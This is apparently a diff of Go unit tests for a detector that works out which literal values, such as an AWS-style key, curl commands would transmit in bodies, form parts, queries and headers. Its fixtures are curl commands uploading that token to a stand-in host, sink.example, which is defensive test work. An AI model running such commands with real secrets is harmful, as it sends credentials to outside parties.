@@ -18,6 +18,7 @@ package actionfacts
 
 import (
 	"slices"
+	"strings"
 	"testing"
 )
 
@@ -116,11 +117,32 @@ func TestStaticCurlUploadPayloads(t *testing.T) {
 			want: []string{"key=" + token + "%09%E2%98%83"},
 		},
 		{
-			name: "repeated URL encoded fragments remain distinct candidates", argv: []string{
+			name: "repeated URL encoded fragments accumulate on wire", argv: []string{
 				"curl", "--data-urlencode", "first=" + token + " value",
 				"--data-urlencode", "second=x/y", "https://sink.example/upload",
 			},
-			want: []string{"first=" + token + "+value", "second=x%2Fy"},
+			want: []string{"first=" + token + "+value&second=x%2Fy"},
+		},
+		{
+			name: "current JSON option suppresses data separator", argv: []string{
+				"curl", "--data", "prefix", "--json", token,
+				"https://sink.example/upload",
+			},
+			want: []string{"prefix" + token},
+		},
+		{
+			name: "current data option adds separator after JSON", argv: []string{
+				"curl", "--json", "prefix", "--data", token,
+				"https://sink.example/upload",
+			},
+			want: []string{"prefix&" + token},
+		},
+		{
+			name: "repeated JSON options concatenate without separator", argv: []string{
+				"curl", "--json", "prefix", "--json", token,
+				"https://sink.example/upload",
+			},
+			want: []string{"prefix" + token},
 		},
 		{
 			name: "GET moves projected data into request query", argv: []string{
@@ -130,10 +152,109 @@ func TestStaticCurlUploadPayloads(t *testing.T) {
 			want: []string{"key=" + token + "+value"},
 		},
 		{
+			name: "GET canonicalizes accumulated percent triplets", argv: []string{
+				"curl", "--get", "--data", "key=" + token + "%2F%ZZ",
+				"https://sink.example/upload",
+			},
+			want: []string{"key=" + token + "%2f%ZZ"},
+		},
+		{
+			name: "GET aggregate exposes only prefix before fragment", argv: []string{
+				"curl", "--get", "--data", "key=" + token + "#hidden",
+				"https://sink.example/upload",
+			},
+			want: []string{"key=" + token},
+		},
+		{
+			name: "GET aggregate preserves UTF8 bytes", argv: []string{
+				"curl", "--get", "--data", "key=" + token + "é",
+				"https://sink.example/upload",
+			},
+			want: []string{"key=" + token + "é"},
+		},
+		{
+			name: "GET aggregate raw space fails before request", argv: []string{
+				"curl", "--get", "--data", "key=" + token + " bad",
+				"https://sink.example/upload",
+			},
+		},
+		{
+			name: "GET data ignores URL-query wire-invalid raw name", argv: []string{
+				"curl", "--get", "--data", "safe=value", "--url-query",
+				"bad name=" + token, "https://sink.example/upload",
+			},
+			want: []string{"safe=value"},
+		},
+		{
+			name: "GET data ignores URL-query raw tab", argv: []string{
+				"curl", "--get", "--data", "safe=value", "--url-query",
+				"+bad\tname=" + token, "https://sink.example/upload",
+			},
+			want: []string{"safe=value"},
+		},
+		{
+			name: "live wire-invalid URL query suppresses POST body proof", argv: []string{
+				"curl", "--data", token, "--url-query", "+bad space",
+				"https://sink.example/upload",
+			},
+		},
+		{
+			name: "missing URL query file suppresses replaced GET data proof", argv: []string{
+				"curl", "--get", "--data", token, "--url-query",
+				"@/definitely/missing", "https://sink.example/upload",
+			},
+		},
+		{
+			name: "request target does not bypass invalid GET aggregate", argv: []string{
+				"curl", "--get", "--data", "key=" + token + " bad",
+				"--request-target", "/safe", "https://sink.example/upload",
+			},
+		},
+		{
 			name: "request target suppresses GET data query", argv: []string{
 				"curl", "--get", "--data-urlencode", "key=" + token,
 				"--request-target", "/safe", "https://sink.example/upload",
 			},
+		},
+		{
+			name: "HTTPS LF request target can fail before body stream", argv: []string{
+				"curl", "--data", token, "--request-target", "/safe\nbad",
+				"https://sink.example/upload",
+			},
+		},
+		{
+			name: "HTTP1 request target retains sibling body", argv: []string{
+				"curl", "--data", token, "--request-target", "/safe\nbad",
+				"http://sink.example/upload",
+			},
+			want: []string{token},
+		},
+		{
+			name: "local HTTP target does not unlock HTTPS LF body proof", argv: []string{
+				"curl", "--data", token, "--request-target", "/safe\nbad",
+				"http://127.0.0.1/upload", "https://sink.example/upload",
+			},
+		},
+		{
+			name: "forced HTTP1 HTTPS request retains sibling body", argv: []string{
+				"curl", "--http1.0", "--data", token, "--request", "POST\nbad",
+				"https://sink.example/upload",
+			},
+			want: []string{token},
+		},
+		{
+			name: "overridden LF request method is inert", argv: []string{
+				"curl", "--data", token, "--request", "POST\nbad", "--request", "POST",
+				"https://sink.example/upload",
+			},
+			want: []string{token},
+		},
+		{
+			name: "dynamic effective HTTPS request target closes body proof", argv: []string{
+				"curl", "--data", token, "--request-target", "/safe",
+				"https://sink.example/upload",
+			},
+			expandIndex: 4,
 		},
 		{
 			name: "sibling file data closes literal payload proof", argv: []string{
@@ -159,6 +280,7 @@ func TestStaticCurlUploadPayloads(t *testing.T) {
 				"curl", "--form", "key=" + token + ";encoder=base64",
 				"https://sink.example/upload",
 			},
+			want: []string{"key"},
 		},
 		{
 			name: "conflicting data and form modes exit before request", argv: []string{
@@ -227,6 +349,374 @@ func TestStaticCurlUploadPayloads(t *testing.T) {
 	}
 }
 
+func TestStaticCurlUploadPayloadsMultipartLiteralComponents(t *testing.T) {
+	t.Parallel()
+
+	const token = "AKIA7Q2M9X4B6C8D3F5H"
+	for _, test := range []struct {
+		name        string
+		argv        []string
+		expandIndex int
+		want        []string
+	}{
+		{
+			name: "typed literal field", argv: []string{
+				"curl", "--form", "field=" + token + ";type=text/plain",
+				"https://sink.example/upload",
+			},
+			want: []string{"field", "text/plain", token},
+		},
+		{
+			name: "quoted semicolon content", argv: []string{
+				"curl", "--form", `field="` + token + `;suffix";type=text/plain`,
+				"https://sink.example/upload",
+			},
+			want: []string{"field", "text/plain", token + ";suffix"},
+		},
+		{
+			name: "quoted escapes and trailing junk", argv: []string{
+				"curl", "--form", `field="` + token + `\\\"tail" ignored;type=text/plain`,
+				"https://sink.example/upload",
+			},
+			want: []string{"field", "text/plain", token + `\"tail`},
+		},
+		{
+			name: "missing close quote falls back to unquoted content", argv: []string{
+				"curl", "--form", `field="` + token,
+				"https://sink.example/upload",
+			},
+			want: []string{"field", `"` + token},
+		},
+		{
+			name: "ordinary empty field name", argv: []string{
+				"curl", "--form", "=" + token, "https://sink.example/upload",
+			},
+			want: []string{token},
+		},
+		{
+			name: "nontransforming attributes preserve body", argv: []string{
+				"curl", "--form", "field=" + token +
+					";filename=safe.txt;headers=X-Test:safe;ignored=value",
+				"https://sink.example/upload",
+			},
+			want: []string{"field", "safe.txt", "X-Test:safe", token},
+		},
+		{
+			name: "empty header sources preserve body", argv: []string{
+				"curl", "--form", "first=" + token + ";headers=@", "--form",
+				"second=" + token + ";headers=<", "https://sink.example/upload",
+			},
+			want: []string{"first", token, "second", token},
+		},
+		{
+			name: "null header and body sources are finite", argv: []string{
+				"curl", "--form", "first=" + token + ";headers=@ /dev/null",
+				"--form", "second=@/dev/null;type=application/" + token,
+				"--form", "third=</dev/null", "https://sink.example/upload",
+			},
+			want: []string{"first", token, "second", "application/" + token, "third"},
+		},
+		{
+			name: "null source filename applies only to at sign mode", argv: []string{
+				"curl", "--form", "first=@ /dev/null;filename=" + token,
+				"--form", "second=<\t/dev/null;filename=ignored-" + token,
+				"https://sink.example/upload",
+			},
+			want: []string{"first", token, "second"},
+		},
+		{
+			name: "null multi-file list projects every final filename", argv: []string{
+				"curl", "--form", "files=@/dev/null;filename=" + token +
+					"-first,/dev/null;filename=" + token +
+					"-middle,/dev/null;filename=" + token +
+					"-final;type=text/plain;headers=X-Key:" + token,
+				"https://sink.example/upload",
+			},
+			want: []string{
+				"files", token + "-first", token + "-middle", token + "-final",
+				"text/plain", "X-Key:" + token,
+			},
+		},
+		{
+			name: "content type extension preserves body", argv: []string{
+				"curl", "--form", "field=" + token +
+					";type=text/plain;charset=utf-8;filename=safe.txt",
+				"https://sink.example/upload",
+			},
+			want: []string{"field", "safe.txt", "text/plain;charset=utf-8", token},
+		},
+		{
+			name: "multipart attribute values are separate wire components", argv: []string{
+				"curl", "--form", "field=safe;filename=" + token +
+					";type=application/" + token + ";X-" + token +
+					";headers=X-Key:" + token,
+				"https://sink.example/upload",
+			},
+			want: []string{
+				"field", token, "application/" + token + ";X-" + token,
+				"X-Key:" + token, "safe",
+			},
+		},
+		{
+			name: "final filename and type replace earlier generated values", argv: []string{
+				"curl", "--form", "field=safe;filename=" + token +
+					";filename=final.txt;type=application/" + token +
+					";filename=again.txt;type=text/plain",
+				"https://sink.example/upload",
+			},
+			want: []string{"field", "again.txt", "text/plain", "safe"},
+		},
+		{
+			name: "explicit type wins and inline content type is skipped", argv: []string{
+				"curl", "--form", token + "=safe;filename=" + token +
+					";type=application/" + token +
+					";headers=Content-Disposition:safe" +
+					";headers=Content-Type:skipped",
+				"https://sink.example/upload",
+			},
+			want: []string{"application/" + token, "Content-Disposition:safe", "safe"},
+		},
+		{
+			name: "first inline content type becomes generated value", argv: []string{
+				"curl", "--form", "field=safe;headers=Content-Type:   application/" +
+					token + ";headers=Content-Type:skipped",
+				"https://sink.example/upload",
+			},
+			want: []string{"field", "application/" + token, "safe"},
+		},
+		{
+			name: "UTF-8 type and non-content-type header remain exact", argv: []string{
+				"curl", "--form", "field=safe;type=application/" + token +
+					"é;headers=X-Key:" + token + "é",
+				"https://sink.example/upload",
+			},
+			want: []string{"field", "application/" + token + "é", "X-Key:" + token + "é", "safe"},
+		},
+		{
+			name: "punctuation and UTF-8 names and filenames remain exact", argv: []string{
+				"curl", "--form", token + ":é=safe;filename=" + token + ":é",
+				"https://sink.example/upload",
+			},
+			want: []string{token + ":é", token + ":é", "safe"},
+		},
+		{
+			name: "quote CR and LF in names and filenames are form escaped", argv: []string{
+				"curl", "--form", "field\"\r\n=safe;filename=file\"\r\n",
+				"https://sink.example/upload",
+			},
+			want: []string{"field%22%0D%0A", "file%22", "safe"},
+		},
+		{
+			name: "last binary encoder preserves body", argv: []string{
+				"curl", "--form", "field=" + token +
+					";encoder=base64;encoder=binary",
+				"https://sink.example/upload",
+			},
+			want: []string{"field", token},
+		},
+		{
+			name: "ASCII 7bit encoder preserves body", argv: []string{
+				"curl", "--form", "field=" + token + ";encoder=7bit",
+				"https://sink.example/upload",
+			},
+			want: []string{"field", token},
+		},
+		{
+			name: "base64 encoder omits transformed body", argv: []string{
+				"curl", "--form", "field=" + token + ";encoder=base64",
+				"https://sink.example/upload",
+			},
+			want: []string{"field"},
+		},
+		{
+			name: "quoted printable encoder preserves ordinary token", argv: []string{
+				"curl", "--form", "field=" + token + ";encoder=quoted-printable",
+				"https://sink.example/upload",
+			},
+			want: []string{"field", token},
+		},
+		{
+			name: "quoted printable encoder transforms equals and trailing space", argv: []string{
+				"curl", "--form", `field="a=b ";encoder=quoted-printable`,
+				"https://sink.example/upload",
+			},
+			want: []string{"field", "a=3Db=20"},
+		},
+		{
+			name: "7bit encoder transmits ASCII prefix before high byte error", argv: []string{
+				"curl", "--form", "field=" + token + "é;encoder=7bit",
+				"https://sink.example/upload",
+			},
+			want: []string{"field", token},
+		},
+		{
+			name: "7bit encoder does not transmit suffix after high byte error", argv: []string{
+				"curl", "--form", "field=é" + token + ";encoder=7bit",
+				"https://sink.example/upload",
+			},
+			want: []string{"field"},
+		},
+		{
+			name: "7bit encoder error suppresses later multipart parts", argv: []string{
+				"curl", "--form", "first=é;encoder=7bit", "--form",
+				token + "=" + token, "https://sink.example/upload",
+			},
+			want: []string{"first"},
+		},
+		{
+			name: "form string keeps suffix syntax literal", argv: []string{
+				"curl", "--form-string", "field=" + token + ";type=text/plain",
+				"https://sink.example/upload",
+			},
+			want: []string{"field", token + ";type=text/plain"},
+		},
+		{
+			name: "balanced nested multipart retains inner body", argv: []string{
+				"curl", "--form", "outer=(;type=multipart/mixed", "--form",
+				"field=" + token, "--form", "=)", "https://sink.example/upload",
+			},
+			want: []string{"outer", "multipart/mixed", "field", token},
+		},
+		{
+			name: "unclosed nested multipart is implicitly closed", argv: []string{
+				"curl", "--form", "outer=(junk;encoder=unknown;filename=safe;" +
+					"headers=X-Test:inline;type=multipart/mixed", "--form",
+				"field=" + token, "https://sink.example/upload",
+			},
+			want: []string{"outer", "multipart/mixed", "X-Test:inline", "field", token},
+		},
+		{
+			name: "named opener remains a request component", argv: []string{
+				"curl", "--form", token + "=(", "--form", "field=safe",
+				"https://sink.example/upload",
+			},
+			want: []string{token, "field", "safe"},
+		},
+		{
+			name: "inline content disposition suppresses generated field name", argv: []string{
+				"curl", "--form", token +
+					`=safe;headers="Content-Disposition: safe"`,
+				"https://sink.example/upload",
+			},
+			want: []string{"Content-Disposition: safe", "safe"},
+		},
+		{
+			name: "MIME semicolon does not suppress generated field name", argv: []string{
+				"curl", "--form", token + "=safe;headers=Content-Disposition;",
+				"https://sink.example/upload",
+			},
+			want: []string{token, "Content-Disposition", "safe"},
+		},
+		{
+			name: "Unicode confusable MIME field does not override ASCII field", argv: []string{
+				"curl", "--form", token +
+					"=safe;headers=Content-Diſposition:safe;headerſ=ignored",
+				"https://sink.example/upload",
+			},
+			want: []string{token, "Content-Diſposition:safe", "safe"},
+		},
+		{
+			name: "dynamic typed form invalidates all payloads", argv: []string{
+				"curl", "--form", "field=safe", "--form",
+				"other=" + token + ";type=text/plain", "https://sink.example/upload",
+			},
+			expandIndex: 4,
+		},
+	} {
+		test := test
+		t.Run(test.name, func(t *testing.T) {
+			t.Parallel()
+			facts := Analyze(Input{Tool: "exec", Argv: test.argv})
+			if len(facts.Commands) != 1 {
+				t.Fatalf("commands = %#v", facts.Commands)
+			}
+			if test.expandIndex > 0 {
+				facts.Commands[0].Arguments[test.expandIndex].Expands = true
+			}
+			if got := StaticCurlUploadPayloads(facts.Commands[0]); !slices.Equal(got, test.want) {
+				t.Fatalf("payloads = %q, want %q", got, test.want)
+			}
+		})
+	}
+}
+
+func TestCurlMIMEQuotedPrintableBytes(t *testing.T) {
+	t.Parallel()
+
+	for _, test := range []struct {
+		name  string
+		value string
+		want  string
+	}{
+		{name: "safe 76 byte terminal line", value: strings.Repeat("A", 76), want: strings.Repeat("A", 76)},
+		{name: "safe 77 byte line wraps before byte 76", value: strings.Repeat("A", 77), want: strings.Repeat("A", 75) + "=\r\nAA"},
+		{name: "CRLF resets and terminal tab encodes", value: "a\r\nb \t", want: "a\r\nb =09"},
+		{name: "terminal space encodes", value: "b ", want: "b=20"},
+		{name: "special and high bytes encode uppercase", value: "=\x7f\xc3", want: "=3D=7F=C3"},
+	} {
+		test := test
+		t.Run(test.name, func(t *testing.T) {
+			t.Parallel()
+			if got := curlMIMEQuotedPrintableBytes(test.value); got != test.want {
+				t.Fatalf("encoded = %q, want %q", got, test.want)
+			}
+		})
+	}
+}
+
+func TestCurlMIMEFormEscape(t *testing.T) {
+	t.Parallel()
+
+	if got, valid := curlMIMEFormEscape("name\"\r\né: "); !valid || got != "name%22%0D%0Aé: " {
+		t.Fatalf("escape = %q, %t", got, valid)
+	}
+	if got, valid := curlMIMEFormEscape(strings.Repeat("a", 7_999_999)); !valid || len(got) != 7_999_999 {
+		t.Fatalf("below-cap escape length = %d, %t", len(got), valid)
+	}
+	if got, valid := curlMIMEFormEscape(strings.Repeat("a", 8_000_000)); valid {
+		t.Fatalf("at-cap escape = length %d, true; want invalid", len(got))
+	}
+}
+
+func TestStaticCurlUploadPayloadsMultipartFailuresInvalidateAll(t *testing.T) {
+	t.Parallel()
+
+	const token = "AKIA7Q2M9X4B6C8D3F5H"
+	for _, operand := range []string{
+		"missing-equals",
+		"field=@payload.txt",
+		"field=<payload.txt",
+		"=)",
+		"outer=(;type=invalid",
+		"outer=(;headers=@headers.txt",
+		"field=" + token + ";headers=@headers.txt",
+		"field=" + token + ";headers=<headers.txt",
+		"field=" + token + ";type=text",
+		"field=" + token + ";encoder=unknown",
+		"field=" + token + ";encoder=bınary",
+		"files=@/dev/null,/dev/null;type=invalid",
+		"files=@/dev/null,/dev/null;encoder=unknown",
+		"files=@/dev/null,/dev/null;headers=@headers.txt",
+		"files=@/dev/null,/tmp/payload;filename=" + token,
+		`files=@/dev/null;type=text/plain;"x,y",/dev/null;filename=` + token,
+	} {
+		operand := operand
+		t.Run(operand, func(t *testing.T) {
+			t.Parallel()
+			facts := Analyze(Input{Tool: "exec", Argv: []string{
+				"curl", "--form", "safe=" + token, "--form", operand,
+				"https://sink.example/upload",
+			}})
+			if len(facts.Commands) != 1 {
+				t.Fatalf("commands = %#v", facts.Commands)
+			}
+			if got := StaticCurlUploadPayloads(facts.Commands[0]); len(got) != 0 {
+				t.Fatalf("payloads = %q, want none", got)
+			}
+		})
+	}
+}
+
 func TestStaticCurlTransmittedMetadata(t *testing.T) {
 	t.Parallel()
 
@@ -273,6 +763,57 @@ func TestStaticCurlTransmittedMetadata(t *testing.T) {
 			checkRequestComponents: true,
 		},
 		{
+			name: "literal URL query survives finite null form sources", argv: []string{
+				"curl", "--url-query", "credential=" + token, "--form",
+				"empty=@/dev/null", "https://sink.example/safe",
+			},
+			wantHTTPRequestComponents: httpsComponents(
+				"/safe", "credential="+token,
+			),
+			checkRequestComponents: true,
+		},
+		{
+			name: "literal URL query survives finite null multi-file form", argv: []string{
+				"curl", "--url-query", "credential=" + token, "--form",
+				"files=@/dev/null,/dev/null;filename=safe",
+				"https://sink.example/safe",
+			},
+			wantHTTPRequestComponents: httpsComponents(
+				"/safe", "credential="+token,
+			),
+			checkRequestComponents: true,
+		},
+		{
+			name: "HTTPS origin query remains exact through validated proxy", argv: []string{
+				"curl", "--proxy", "http://proxy.example", "--url-query",
+				"credential=" + token + " value", "https://sink.example/safe",
+			},
+			wantHTTPRequestComponents: httpsComponents(
+				"/safe", "credential="+token+"+value",
+			),
+			checkRequestComponents: true,
+		},
+		{
+			name: "HTTP forward proxy suppresses global origin header authority", argv: []string{
+				"curl", "--proxy", "http://127.0.0.1:8080", "--header",
+				"Proxy-Authorization: " + token, "http://sink.example/safe",
+			},
+			checkRequestComponents: true,
+		},
+		{
+			name: "mixed proxy targets retain only HTTPS request components", argv: []string{
+				"curl", "--proxy", "http://proxy.example", "--header",
+				"Connection: X-Token", "--header", "X-Token: " + token,
+				"--url-query", "key=" + token, "http://one.example/http",
+				"https://two.example/https",
+			},
+			wantHTTPRequestComponents: []TransmittedRequestComponent{
+				{Value: "/https", Scheme: "https", Host: "two.example"},
+				{Value: "key=" + token, Scheme: "https", Host: "two.example"},
+			},
+			checkRequestComponents: true,
+		},
+		{
 			name: "joined and raw URL query options accumulate", argv: []string{
 				"curl", "--url-query=first=" + token,
 				"--url-query", "+second=fixture", "https://sink.example/safe",
@@ -309,12 +850,12 @@ func TestStaticCurlTransmittedMetadata(t *testing.T) {
 			checkRequestComponents:    true,
 		},
 		{
-			name: "transformed URL query does not erase literal header", argv: []string{
+			name: "encoded URL query projects transformed wire bytes", argv: []string{
 				"curl", "--url-query", "name=two words", "--header",
 				"X-Token: " + token, "https://sink.example/safe",
 			},
 			wantHeaders:               []string{"X-Token: " + token},
-			wantHTTPRequestComponents: httpsComponents("/safe"),
+			wantHTTPRequestComponents: httpsComponents("/safe", "name=two+words"),
 			checkRequestComponents:    true,
 		},
 		{
@@ -325,12 +866,77 @@ func TestStaticCurlTransmittedMetadata(t *testing.T) {
 			checkRequestComponents:    true,
 		},
 		{
-			name: "transformed URL query operand omits only query lane", argv: []string{
+			name: "encoded URL query preserves raw name and encodes content", argv: []string{
 				"curl", "--url-query", `credential=BACK\` + token,
 				"https://sink.example/safe",
 			},
-			wantHTTPRequestComponents: httpsComponents("/safe"),
+			wantHTTPRequestComponents: httpsComponents(
+				"/safe", "credential=BACK%5c"+token,
+			),
+			checkRequestComponents: true,
+		},
+		{
+			name: "encoded content hash does not introduce fragment", argv: []string{
+				"curl", "--url-query", "credential=" + token + "#suffix",
+				"https://sink.example/safe",
+			},
+			wantHTTPRequestComponents: httpsComponents(
+				"/safe", "credential="+token+"%23suffix",
+			),
+			checkRequestComponents: true,
+		},
+		{
+			name: "URL API lowercases valid percent triplets only", argv: []string{
+				"curl", "--url-query", "+key=" + token + "%2F%ZZ",
+				"https://sink.example/safe",
+			},
+			wantHTTPRequestComponents: httpsComponents(
+				"/safe", "key="+token+"%2f%ZZ",
+			),
+			checkRequestComponents: true,
+		},
+		{
+			name: "encoded-form raw name fragment suppresses content and later values", argv: []string{
+				"curl", "--url-query", "prefix#fragment=" + token,
+				"--url-query", "later=" + token,
+				"https://sink.example/safe",
+			},
+			wantHTTPRequestComponents: httpsComponents("/safe", "prefix"),
 			checkRequestComponents:    true,
+		},
+		{
+			name: "Unicode raw name and encoded control content are transmitted", argv: []string{
+				"curl", "--url-query", "méta=" + token + "\n",
+				"https://sink.example/safe",
+			},
+			wantHTTPRequestComponents: httpsComponents(
+				"/safe", "méta="+token+"%0a",
+			),
+			checkRequestComponents: true,
+		},
+		{
+			name: "raw URL query transmits UTF8 bytes", argv: []string{
+				"curl", "--url-query", "+key=" + token + "é",
+				"https://sink.example/safe",
+			},
+			wantHTTPRequestComponents: httpsComponents(
+				"/safe", "key="+token+"é",
+			),
+			checkRequestComponents: true,
+		},
+		{
+			name: "space in raw name fails before request", argv: []string{
+				"curl", "--url-query", "bad name=" + token,
+				"https://sink.example/safe",
+			},
+			checkRequestComponents: true,
+		},
+		{
+			name: "DEL in raw name fails before request", argv: []string{
+				"curl", "--url-query", "bad\x7fname=" + token,
+				"https://sink.example/safe",
+			},
+			checkRequestComponents: true,
 		},
 		{
 			name: "URL query file excludes all metadata", argv: []string{
@@ -352,6 +958,23 @@ func TestStaticCurlTransmittedMetadata(t *testing.T) {
 				"curl", "--get", "--data", "fixture=value", "--url-query",
 				"credential=" + token, "https://sink.example/safe",
 			},
+			wantHTTPRequestComponents: httpsComponents("/safe"),
+			checkRequestComponents:    true,
+		},
+		{
+			name: "invalid GET aggregate suppresses sibling origin metadata", argv: []string{
+				"curl", "--get", "--data", "bad space", "--header",
+				"Authorization: " + token, "https://sink.example/safe",
+			},
+			checkRequestComponents: true,
+		},
+		{
+			name: "GET data ignores wire-invalid replaced URL query", argv: []string{
+				"curl", "--get", "--data", "safe=value", "--url-query",
+				"bad name=" + token, "--header", "X-Key: " + token,
+				"https://sink.example/safe",
+			},
+			wantHeaders:               []string{"X-Key: " + token},
 			wantHTTPRequestComponents: httpsComponents("/safe"),
 			checkRequestComponents:    true,
 		},
@@ -918,6 +1541,39 @@ func TestStaticCurlTransmittedMetadata(t *testing.T) {
 				"https://sink.example/search",
 			},
 			wantHeaders:            []string{"Authorization: " + token},
+			checkRequestComponents: true,
+		},
+		{
+			name: "HTTPS LF request target can fail before origin headers", argv: []string{
+				"curl", "--header", "Authorization: " + token,
+				"--request-target", "/bad\ntarget", "https://sink.example/search",
+			},
+			checkRequestComponents: true,
+		},
+		{
+			name: "HTTP1 LF request target retains sibling origin headers", argv: []string{
+				"curl", "--header", "Authorization: " + token,
+				"--request-target", "/bad\ntarget", "http://sink.example/search",
+			},
+			wantHeaders:            []string{"Authorization: " + token},
+			checkRequestComponents: true,
+		},
+		{
+			name: "overridden LF request target is inert", argv: []string{
+				"curl", "--header", "Authorization: " + token,
+				"--request-target", "/bad\ntarget", "--request-target", "/safe",
+				"https://sink.example/search",
+			},
+			wantHeaders:               []string{"Authorization: " + token},
+			wantHTTPRequestComponents: httpsComponents("/safe"),
+			checkRequestComponents:    true,
+		},
+		{
+			name: "dynamic effective HTTPS request target closes header proof", argv: []string{
+				"curl", "--header", "Authorization: " + token,
+				"--request-target", "/safe", "https://sink.example/search",
+			},
+			expandIndex:            4,
 			checkRequestComponents: true,
 		},
 		{
